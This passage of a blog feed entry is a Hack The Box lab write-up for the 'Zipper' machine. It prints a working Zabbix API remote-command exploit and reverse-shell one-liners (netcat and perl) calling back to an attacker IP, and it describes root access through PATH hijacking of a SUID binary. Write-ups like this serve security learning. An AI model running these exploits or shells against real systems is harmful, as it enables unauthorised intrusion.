&lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[41m[zabbix_cmd]&amp;gt;&amp;gt;: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[0m '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Result of last command:&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;quit&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;### update&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;jsonrpc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;2.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;method&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;script.update&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;params&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		    &lt;span class=&quot;s&quot;&gt;&quot;scriptid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		    &lt;span class=&quot;s&quot;&gt;&quot;command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		    &lt;span class=&quot;s&quot;&gt;&quot;execute_on&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;auth&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'result'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;cmd_upd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;### execute&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;jsonrpc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;2.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;method&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;script.execute&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;params&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		    &lt;span class=&quot;s&quot;&gt;&quot;scriptid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		    &lt;span class=&quot;s&quot;&gt;&quot;hostid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hostid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;auth&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'result'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;&quot;execute_on&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;cmd_exe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;cmd_exe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd_exe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#	print cmd_exe[&quot;result&quot;][&quot;value&quot;]&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;first-thing-we-will-notice-that-we-are-zabbix-and-in-home-theres-a-directory-for-the-user-zapper&quot;&gt;First thing we will notice that we are &lt;code class=&quot;highlighter-rouge&quot;&gt;zabbix&lt;/code&gt; and in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; there’s a directory for the user &lt;code class=&quot;highlighter-rouge&quot;&gt;zapper&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-cant-read-usertxt-and-we-cant-go-into-ssh&quot;&gt;We can’t read &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; and we can’t go into &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-another-directory-called-utils-which-contains-2-files--backupsh-and-zabbix-service&quot;&gt;There’s another directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;utils&lt;/code&gt; which contains 2 files , &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.sh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;zabbix-service&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat backup.sh&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/zipper/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-that-it-has-a-hardcoded-password-in-it--zippitydodah--we-can-try-to-su-to-zapper-with-that-password&quot;&gt;We see that it has a hardcoded password in it : &lt;code class=&quot;highlighter-rouge&quot;&gt;ZippityDoDah&lt;/code&gt; , we can try to &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to zapper with that password&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-it-worked--now-we-can-get-the-ssh-key-from-ssh-and-have-ssh-connection&quot;&gt;And it worked , now we can get the ssh key from &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; and have ssh connection&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/30.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/zipper/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;privilege-escalation-and-getting-root&quot;&gt;Privilege Escalation and getting root&lt;/h3&gt;
&lt;h4 id=&quot;if-we-take-a-look-at-the-utils-directory-again-and-execute-zabbix-service-&quot;&gt;If we take a look at the &lt;code class=&quot;highlighter-rouge&quot;&gt;utils&lt;/code&gt; directory again and execute &lt;code class=&quot;highlighter-rouge&quot;&gt;zabbix-service&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/32.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/zipper/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asks-us-start-or-stop-then-it-executes-something-and-exits--we-will-check-if-that-binary-is-a-suid-binary-&quot;&gt;It asks us start or stop? then it executes something and exits , we will check if that binary is a suid binary :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find /home/zapper/utils -perm -4000&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/zipper/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-a-suid-binary--we-need-to-know-what-is-it-doing-without-reverse-engineering--strings-was-enough-&quot;&gt;It’s a suid binary , we need to know what is it doing. Without reverse engineering , &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; was enough :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strings zabbix-service&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/zipper/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-command-is-being-executed-when-we-type-start--systemctl-daemon-reload--systemctl-start-zabbix-agent--so-what-are-we-going-to-do-is-the-same-as-we-did-in-dab--the-only-difference-is-in-dab-we-hijacked-a-shared-library-that-the-binary-used--but-here-we-will-hijack-a-binary-by-default-systemctl-points-to-binsystemctl&quot;&gt;This command is being executed when we type &lt;code class=&quot;highlighter-rouge&quot;&gt;start&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl daemon-reload &amp;amp;&amp;amp; systemctl start zabbix-agent&lt;/code&gt; , so what are we going to do is the same as we did in &lt;a href=&quot;/hack-the-box/dab/&quot;&gt;Dab&lt;/a&gt; , the only difference is in dab we hijacked a shared library that the binary used , but here we will hijack a binary. By default &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl&lt;/code&gt; points to &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/systemctl&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-create-a-c-program-to-execute-binbash-&quot;&gt;We will create a &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; program to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-compile-it-with-gcc--gcc-exploitc--o-systemctl&quot;&gt;Then we will compile it with gcc : &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc exploit.c -o systemctl&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-we-have-our-fake-binary-ready-&quot;&gt;Now we have our fake binary ready :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-add-homezapperutils-as-the-first-entry-in-path-env-variable--so-the-system-will-look-there-first-&quot;&gt;We will add &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/zapper/utils&lt;/code&gt; as the first entry in &lt;code class=&quot;highlighter-rouge&quot;&gt;PATH&lt;/code&gt; env variable , so the system will look there first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=/home/zapper/utils:$PATH&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-is-changing-the-path-variable-to-homezapperutils--the-old-path&quot;&gt;This is changing the &lt;code class=&quot;highlighter-rouge&quot;&gt;PATH&lt;/code&gt; variable to &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/zapper/utils:&lt;/code&gt; + the old path&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-systemctl-points-to-our-fake-binary--lets-run-zabbix-service-&quot;&gt;Now &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl&lt;/code&gt; points to our fake binary , let’s run &lt;code class=&quot;highlighter-rouge&quot;&gt;zabbix-service&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---giddy&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/giddy/&quot;&gt;Hack The Box - Giddy&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---access&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/access/&quot;&gt;Hack The Box - Access&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Zipper retired and here’s my write-up. Owning user on this box was challenging because we have to exploit an RCE vulnerability which is not really easy and then we have to get a stable shell to be able to enumerate, for the privilege escalation it was easy but I also liked it because it was a binary exploitation. It was a very fun box and I liked it. It’s a linux box and its ip is 10.10.10.108 , I added it to /etc/hosts as zipper.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC zipper.htb We only get 2 ports , http on port 80 and ssh on port 22. so we are going to check http HTTP enumeration By visiting zipper.htb we get the default apache2 page : So I’m going to run gobuster with directory-list-2.3-medium.txt to see if there are any sub directories : gobuster -u http://zipper.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Output : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://zipper.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 4m10s ===================================================== 2019/02/22 08:50:38 Starting gobuster ===================================================== /zabbix (Status: 301) We got /zabbix , let’s look at that in the browser : We get this login page , we don’t have credentials but down there there’s an option to sign in as a guest , but before we do that let’s get an idea about zabbix Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption. -Wikipedia So basically it’s a server monitoring tool , let’s login as a guest and see what we can get We get this dashboard , but we are not privileged to do anything because we are guest After some enumeration we will notice in : Monitoring –&amp;gt; Latest data , Zapper's Backup Script Now we have a potential username : zapper , we can try to brute force or fuzz the password , but a quick guess worked for me , the username is the password zapper : zapper GUI access disabled , on exploit-db there’s an authenticated remote code execution exploit for an old version of zabbix , check it here , Unfortunately valid credentials are not enough to exploit it , if we take a look here : We also need hostid , and to get that we need to get GUI access GUI access through zabbix-cli There’s a cli tool for zabbix on github , we can use it to gain GUI access. Installation and configuration is simple you will get the source from github then install it with install.py install then you will create a conf file for it by executing zabbix-cli --config, it will be saved in $HOME/.zabbix-cli/zabbix-cli.conf , open the conf file and in Zabbix API section add this line zabbix_api_url=http://10.10.10.108/zabbix. For details read the documentation here Then we will run zabbix-cli it will ask for a username and a password , we already have them zapper : zapper if we executed show_usergroups we will see that zapper is in a group called No access to the fronted and GUI access to that group is disabled We will create a new group and call it guiaccess and leave GUI access as system default create_usergroup Then we will add zapper to that group and delete him from No access to the fronted add_user_to_usergroup remove_user_from_usergroup Now if we try to login again as zapper we will get the dashboard : RCE and getting user From Configuration –&amp;gt; Hosts we have 2 hosts and the second one is the availabe one : If we click on it we will get an edit page , but we will notice that the host id is included in the url as a GET parameter : Now we can edit the python exploit and add the host id : 10106 , this is how the basic login info in the script will look like : And we get a decent shell , but this shell executes commands through API requests which is not efficient , so we will get a reverse shell like this : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f I got this shell from payload all the things Problem is , we will find that we are in a docker container , and that’s actually a bad rabbit hole and when I was doing this box for the first time i spent a lot of time trying to escape this docker container , And eventually i found out that this is the wrong server. If we take a look at this page from zabbix documentation , this part : there’s an option called execute_on , which has 2 possible values : 0 to execute on zabbix agent , and 1 to execute on zabbix server. We don’t have that option included in the exploit so we are using the default option 1 which means we are executing commands on zabbix server. So we will edit the exploit json data and add &quot;execute_on&quot; : &quot;0&quot; in those 2 parts : After that we will run the exploit again and now it will run on the right server , however the shell that we used before didn’t work and died immediately because the exploit crashed for some reason , I had to comment out the last line which prints the result : print cmd_exe[&quot;result&quot;][&quot;value&quot;] , but it didn’t fix it , so I tried some other shells and the perl one worked : perl -e 'use Socket;$i=&quot;10.10.xx.xx&quot;;$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};' Then I used used python3 pty to get a proper shell , python2 didn’t exist on the server Final exploit after edits : #!/usr/bin/python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = 'http://10.10.10.108/zabbix' ### Zabbix IP-address url = ZABIX_ROOT + '/api_jsonrpc.php' ### Don't edit login = 'zapper' ### Zabbix login password = 'zapper' ### Zabbix password hostid = '10106' ### Zabbix hostid ### auth payload = { &quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;method&quot; : &quot;user.login&quot;, &quot;params&quot;: { 'user': &quot;&quot;+login+&quot;&quot;, 'password': &quot;&quot;+password+&quot;&quot;, }, &quot;auth&quot; : None, &quot;id&quot; : 0, } headers = { 'content-type': 'application/json', } auth = requests.post(url, data=json.dumps(payload), headers=(headers)) auth = auth.json() while True: cmd = raw_input('\033[41m[zabbix_cmd]&amp;gt;&amp;gt;: \033[0m ') if cmd == &quot;&quot; : print &quot;Result of last command:&quot; if cmd == &quot;quit&quot; : break ### update payload = { &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.update&quot;, &quot;params&quot;: { &quot;scriptid&quot;: &quot;1&quot;, &quot;command&quot;: &quot;&quot;+cmd+&quot;&quot;, &quot;execute_on&quot; : &quot;0&quot; }, &quot;auth&quot; : auth['result'], &quot;id&quot; : 0, } cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers)) ### execute payload = { &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.execute&quot;, &quot;params&quot;: { &quot;scriptid&quot;: &quot;1&quot;, &quot;hostid&quot;: &quot;&quot;+hostid+&quot;&quot; }, &quot;auth&quot; : auth['result'], &quot;id&quot; : 0, &quot;execute_on&quot; : &quot;1&quot; } cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers)) cmd_exe = cmd_exe.json() # print cmd_exe[&quot;result&quot;][&quot;value&quot;] First thing we will notice that we are zabbix and in /home there’s a directory for the user zapper We can’t read user.txt and we can’t go into .ssh There’s another directory called utils which contains 2 files , backup.sh and zabbix-service cat backup.sh We see that it has a hardcoded password in it : ZippityDoDah , we can try to su to zapper with that password And it worked , now we can get the ssh key from .ssh and have ssh connection And we owned user ! Privilege Escalation and getting root If we take a look at the utils directory again and execute zabbix-service : It asks us start or stop? then it executes something and exits , we will check if that binary is a suid binary : find /home/zapper/utils -perm -4000 It’s a suid binary , we need to know what is it doing. Without reverse engineering , strings was enough : strings zabbix-service This command is being executed when we type start : systemctl daemon-reload &amp;amp;&amp;amp; systemctl start zabbix-agent , so what are we going to do is the same as we did in Dab , the only difference is in dab we hijacked a shared library that the binary used , but here we will hijack a binary. By default systemctl points to /bin/systemctl We will create a c program to execute /bin/bash : Then we will compile it with gcc : gcc exploit.c -o systemctl Now we have our fake binary ready : We will add /home/zapper/utils as the first entry in PATH env variable , so the system will look there first : export PATH=/home/zapper/utils:$PATH This is changing the PATH variable to /home/zapper/utils: + the old path Now systemctl points to our fake binary , let’s run zabbix-service : And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Giddy Next Hack The Box write-up : Hack The Box - Access</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/zipper/0.png" 